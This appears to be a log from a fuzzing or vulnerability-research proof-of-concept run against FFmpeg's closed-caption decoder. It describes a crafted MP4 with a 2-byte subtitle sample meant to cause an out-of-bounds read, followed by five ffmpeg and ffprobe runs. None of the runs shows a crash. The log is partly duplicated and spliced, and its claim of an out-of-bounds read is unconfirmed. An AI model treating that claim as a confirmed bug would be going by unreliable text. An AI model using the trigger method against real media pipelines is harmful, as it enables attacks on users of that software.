@@ -1,0 +1,202 @@
+=== VULN-001 PoC Run ===
+Date: Mon Sep  7 06:53:36 PM +08 2026
+
+[*] Generating crafted MP4 with 2-byte c608 subtitle sample...
+[+] Written 543 bytes to /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_input.mp4
+[+] CC_DATA size = 2 bytes (should be NOT multiple of 3 -> triggers OOB)
+[+] chunk_offset = 541 (patched into stco)
+[+] sample->size = 2 <= 8, so mov.c skips get_eia608_packet()
+[+] Raw 2-byte packet passed to ccaption_dec decode()
+[+] In decode(): loop runs with i=0, validate_cc_data_pair reads bptr[2] OOB!
+
+[*] Running ffmpeg (attempt 1: -map 0 -f null)...
+
+[*] Running ffmpeg (attempt 2: -map 0:s to .srt output)...
+
+[*] Running ffmpeg (attempt 3: -map 0:s to .ass output)...
+
+[*] Running ffmpeg (attempt 4: -f ass pipe output)...
+
+[*] Running ffprobe with -show_packets (attempt 5)...
+
+=== Done ===
+] Raw 2-byte packet passed to ccaption_dec decode()
+[+] In decode(): loop runs with i=0, validate_cc_data_pair reads bptr[2] OOB!
+
+[*] Running ffmpeg (attempt 1: -map 0 -f null)...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_input.mp4':
+  Metadata:
+    major_brand     : isom
+    minor_version   : 0
+    compatible_brands: isomiso2mp41
+  Duration: 00:00:01.00, bitrate: 4 kb/s
+  Stream #0:0[0x1](und): Subtitle: eia_608 (cc_dec) (c608 / 0x38303663), 0 kb/s (default)
+    Metadata:
+      handler_name    : Subtitle Handler
+[sost#0:0 @ 0x517000000b00] Automatic encoder selection failed Default encoder for format null (codec none) is probably disabled. Please choose an encoder manually.
+[sost#0:0 @ 0x517000000b00] Error selecting an encoder
+Error opening output file -.
+Error opening output files: Encoder not found
+
+[*] Running ffmpeg (attempt 2: -map 0:s to .srt output)...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_input.mp4':
+  Metadata:
+    major_brand     : isom
+    minor_version   : 0
+    compatible_brands: isomiso2mp41
+  Duration: 00:00:01.00, bitrate: 4 kb/s
+  Stream #0:0[0x1](und): Subtitle: eia_608 (cc_dec) (c608 / 0x38303663), 0 kb/s (default)
+    Metadata:
+      handler_name    : Subtitle Handler
+Stream mapping:
+  Stream #0:0 -> #0:0 (eia_608 (cc_dec) -> subrip (srt))
+Press [q] to stop, [?] for help
+Output #0, srt, to '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_out.srt':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0(und): Subtitle: subrip (default)
+    Metadata:
+      encoder         : Lavc63.11.100 srt
+      handler_name    : Subtitle Handler
+[out#0/srt @ 0x511000000b80] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/srt @ 0x511000000b80] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+
+[*] Running ffmpeg (attempt 3: -map 0:s to .ass output)...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_input.mp4':
+  Metadata:
+    major_brand     : isom
+    minor_version   : 0
+    compatible_brands: isomiso2mp41
+  Duration: 00:00:01.00, bitrate: 4 kb/s
+  Stream #0:0[0x1](und): Subtitle: eia_608 (cc_dec) (c608 / 0x38303663), 0 kb/s (default)
+    Metadata:
+      handler_name    : Subtitle Handler
+Stream mapping:
+  Stream #0:0 -> #0:0 (eia_608 (cc_dec) -> ass (ssa))
+Press [q] to stop, [?] for help
+Output #0, ass, to '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_out.ass':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0(und): Subtitle: ass (default)
+    Metadata:
+      encoder         : Lavc63.11.100 ssa
+      handler_name    : Subtitle Handler
+[out#0/ass @ 0x511000000b80] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:1KiB muxing overhead: unknown
+[out#0/ass @ 0x511000000b80] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       1KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+
+[*] Running ffmpeg (attempt 4: -f ass pipe output)...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_input.mp4':
+  Metadata:
+    major_brand     : isom
+    minor_version   : 0
+    compatible_brands: isomiso2mp41
+  Duration: 00:00:01.00, bitrate: 4 kb/s
+  Stream #0:0[0x1](und): Subtitle: eia_608 (cc_dec) (c608 / 0x38303663), 0 kb/s (default)
+    Metadata:
+      handler_name    : Subtitle Handler
+Stream mapping:
+  Stream #0:0 -> #0:0 (eia_608 (cc_dec) -> ass (ssa))
+Press [q] to stop, [?] for help
+[Script Info]
+; Script generated by FFmpeg/Lavc63.11.100
+ScriptType: v4.00+
+PlayResX: 384
+PlayResY: 288
+ScaledBorderAndShadow: yes
+YCbCr Matrix: None
+
+[V4+ Styles]
+Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding
+Style: Default,Monospace,16,&Hffffff,&Hffffff,&H0,&H0,0,0,0,0,100,100,0,0,3,1,0,2,10,10,10,1
+
+[Events]
+Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text
+Output #0, ass, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0(und): Subtitle: ass (default)
+    Metadata:
+      encoder         : Lavc63.11.100 ssa
+      handler_name    : Subtitle Handler
+[out#0/ass @ 0x511000000b80] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:1KiB muxing overhead: unknown
+[out#0/ass @ 0x511000000b80] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       1KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+
+[*] Running ffprobe with -show_packets (attempt 5)...
+ffprobe version N-126435-gf93cd72dde Copyright (c) 2007-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ccaption_dec_c/vuln_001_input.mp4':
+  Metadata:
+    major_brand     : isom
+    minor_version   : 0
+    compatible_brands: isomiso2mp41
+  Duration: 00:00:01.00, bitrate: 4 kb/s
+  Stream #0:0[0x1](und): Subtitle: eia_608 (cc_dec) (c608 / 0x38303663), 0 kb/s (default)
+    Metadata:
+      handler_name    : Subtitle Handler
+[PACKET]
+codec_type=subtitle
+stream_index=0
+pts=0
+pts_time=0.000000
+dts=0
+dts_time=0.000000
+duration=90000
+duration_time=1.000000
+size=2
+pos=541
+flags=K__
+[/PACKET]
+
+=== Done ===
+EXIT=0
